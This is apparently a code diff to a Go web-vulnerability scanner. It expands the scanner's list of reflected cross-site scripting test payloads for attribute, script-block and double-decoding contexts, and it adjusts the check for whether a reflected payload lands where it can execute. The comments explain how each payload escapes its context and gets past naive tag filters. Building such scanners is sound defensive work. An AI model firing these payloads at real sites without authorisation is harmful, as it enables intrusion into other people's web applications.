@@ -19,18 +19,41 @@ import (
 // single judge can decide whether any of them came back executable, and so the
 // evidence a reader sees is always the same obvious proof.
 var xssSeeds = []string{
+	// Markup contexts: the payload becomes an element.
 	"<script>alert(document.domain)</script>",
-	"<script>confirm(document.domain)</script>",
 	"<img src=x onerror=alert(document.domain)>",
 	"<svg/onload=alert(document.domain)>",
-	"<body onload=alert(document.domain)>",
-	"<iframe src=javascript:alert(document.domain)>",
 	"<details open ontoggle=alert(document.domain)>",
-	"<input autofocus onfocus=alert(document.domain)>",
+	"<iframe src=javascript:alert(document.domain)>",
+
+	// Attribute contexts. Each needs its own closing form: a value sitting in
+	// double quotes is not escaped by a single one, and a value that is not
+	// quoted at all is closed by whitespace. Sending only the first of these is
+	// why a scanner reports the easy attributes and misses the rest.
+	`" onmouseover="alert(document.domain)`,
+	`" autofocus onfocus=alert(document.domain) x="`,
+	`' onmouseover='alert(document.domain)`,
+	`' autofocus onfocus=alert(document.domain) x='`,
+	` autofocus onfocus=alert(document.domain) `,
+	`javascript:alert(document.domain)`,
+
+	// Escaping the surrounding markup first, then introducing a new element.
 	`"><script>alert(document.domain)</script>`,
 	`'><img src=x onerror=alert(document.domain)>`,
 	`</title><script>alert(document.domain)</script>`,
-	"<script>alert(document.domain)</script >",
+
+	// A context that decodes twice — an `srcdoc` attribute is the common one — turns
+	// an entity-encoded tag back into markup on the second pass. A page that filters
+	// tags by looking for `<` sees nothing to strip, and the filter and the output
+	// context disagree about what the value is. Only the literal forms would miss it.
+	`&lt;img src=x onerror=alert(document.domain)&gt;`,
+	`&lt;svg onload=alert(document.domain)&gt;`,
+
+	// Inside a script block, the payload has to leave the string it was written
+	// into before it can run.
+	`';alert(document.domain);var x='`,
+	`"-alert(document.domain)-"`,
+	`</script><script>alert(document.domain)</script>`,
 }
 
 // xssReflected detects reflected cross-site scripting.
@@ -90,10 +113,20 @@ func executableContext(body, marker string) bool {
 		}
 	}
 
-	// Inside a tag: the parser is reading an attribute value, so the payload
+	inTag := strings.LastIndex(before, "<") > strings.LastIndex(before, ">")
+
+	// A payload carrying no markup characters cannot create an element. The
+	// `javascript:` forms are like this: they do nothing in a text node and only
+	// run when they land in a URL-bearing attribute, so their being present in
+	// the body is not evidence of anything.
+	if !strings.ContainsAny(marker, "<>") {
+		return inTag
+	}
+
+	// Inside a tag, the parser is reading an attribute value, so the payload
 	// cannot open an element — unless it is one of the seeds that closes the
 	// attribute first.
-	if lastOpen, lastClose := strings.LastIndex(before, "<"), strings.LastIndex(before, ">"); lastOpen > lastClose {
+	if inTag {
 		switch {
 		case strings.HasPrefix(marker, "\""), strings.HasPrefix(marker, "'"),
 			strings.HasPrefix(marker, ">"), strings.HasPrefix(marker, "/>"):
